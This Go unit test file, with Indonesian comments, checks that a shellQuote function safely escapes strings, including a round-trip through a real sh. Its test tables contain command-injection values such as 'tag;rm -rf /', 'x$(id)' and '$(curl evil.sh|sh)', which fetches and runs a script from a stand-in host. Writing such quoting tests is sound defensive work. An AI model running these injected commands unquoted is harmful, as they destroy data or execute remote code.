package project

import (
	"os/exec"
	"strconv"
	"testing"
)

func TestShellQuote_BentukEscape(t *testing.T) {
	cases := map[string]string{
		"plain":         "'plain'",
		"a b":           "'a b'",
		"x$(id)":        "'x$(id)'",
		"x`id`":         "'x`id`'",
		"tag;rm -rf /":  "'tag;rm -rf /'",
		"a'b":           `'a'\''b'`,
		"":              "''",
		"line\nbreak":   "'line\nbreak'",
		"&& curl evil":  "'&& curl evil'",
		"a=b*.go~$HOME": "'a=b*.go~$HOME'",
	}
	for in, want := range cases {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

// TestShellQuote_DiujiKeShellNyata memastikan nilai berbahaya benar-benar
// diterima shell sebagai satu argumen literal, bukan dieksekusi/dipecah.
// Inilah bukti yang tidak diberikan oleh %q.
func TestShellQuote_DiujiKeShellNyata(t *testing.T) {
	shellPath, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("sh tidak tersedia, lewati uji round-trip")
	}

	dangerous := []string{
		"x$(id)",
		"x`id`",
		"tag;rm -rf /",
		"a b; c",
		"a'b\"c",
		"$(curl evil.sh|sh)",
		" && malicious",
	}
	for _, value := range dangerous {
		// printf '%s' <argumen> → harus mengembalikan nilai apa adanya.
		out, err := exec.Command(shellPath, "-c", "printf %s "+shellQuote(value)).Output()
		if err != nil {
			t.Fatalf("shell menolak argumen %q: %v", value, err)
		}
		if string(out) != value {
			t.Errorf("shell mengubah argumen: got %s, want %s", strconv.Quote(string(out)), strconv.Quote(value))
		}
	}
}
